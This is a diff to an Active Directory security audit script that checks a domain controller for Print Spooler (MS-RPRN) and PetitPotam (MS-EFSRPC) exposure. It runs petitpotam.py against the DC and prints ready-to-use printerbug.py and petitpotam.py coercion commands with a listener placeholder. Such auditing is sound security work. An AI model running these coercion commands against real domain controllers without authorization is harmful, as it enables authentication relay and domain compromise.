@@ -248,23 +248,38 @@ else
   echo -e "${GREEN}[OK] No Unconstrained Delegation on non-DC systems${NC}"
 fi
 
-# Print Spooler Check on DC
-SPOOLER_CHECK=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -M spooler 2>/dev/null)
-if echo "$SPOOLER_CHECK" | grep -qi "Spooler.*enabled\|TRUE"; then
-  echo -e "${RED}[KO] Print Spooler running on DC $DC_HOSTNAME${NC}"
-  
-  # Check for non-DC unconstrained delegation
-  NON_DC_UNCON=$(echo "$UNCON_SYSTEMS" | grep -v "DC[0-9]*\$" | grep -v "^$")
+# Print Spooler (MS-RPRN) Check on DC
+SPOOLER_CHECK=$(rpcdump.py "$USERNAME:$PASSWORD@$DC_IP" 2>/dev/null | grep -i "MS-RPRN")
+if [ ! -z "$SPOOLER_CHECK" ]; then
+  echo -e "${RED}[KO] Print Spooler (MS-RPRN) active on DC${NC}"
   if [ ! -z "$NON_DC_UNCON" ]; then
     echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
   else
-    echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets (DCs only)${NC}"
+    echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets${NC}"
   fi
-  echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
-elif echo "$SPOOLER_CHECK" | grep -qi "STATUS_PIPE_NOT_AVAILABLE"; then
-  echo -e "${GREEN}[OK] Print Spooler disabled on DC${NC}"
+  echo -e "${GREY}       printerbug.py '$DOMAIN'/'$USERNAME':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}"
 else
-  echo -e "${GREY}[--] Print Spooler status unknown${NC}"
+  echo -e "${GREEN}[OK] Print Spooler (MS-RPRN) disabled on DC${NC}"
+fi
+
+# PetitPotam (MS-EFSRPC) Check on DC
+if command -v petitpotam.py &>/dev/null; then
+  PETITPOTAM_OUTPUT=$(petitpotam.py -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" 127.0.0.1 $DC_IP 2>&1)
+  if echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
+    echo -e "${RED}[KO] PetitPotam (MS-EFSRPC) vulnerable on DC${NC}"
+    if [ ! -z "$NON_DC_UNCON" ]; then
+      echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
+    else
+      echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets${NC}"
+    fi
+    echo -e "${GREY}       petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+  elif echo "$PETITPOTAM_OUTPUT" | grep -q "probably PATCHED" && ! echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
+    echo -e "${GREEN}[OK] PetitPotam (MS-EFSRPC) patched on DC${NC}"
+  else
+    echo -e "${GREY}[--] PetitPotam check failed${NC}"
+  fi
+else
+  echo -e "${GREY}[--] petitpotam.py not found${NC}"
 fi
 
 # WPAD
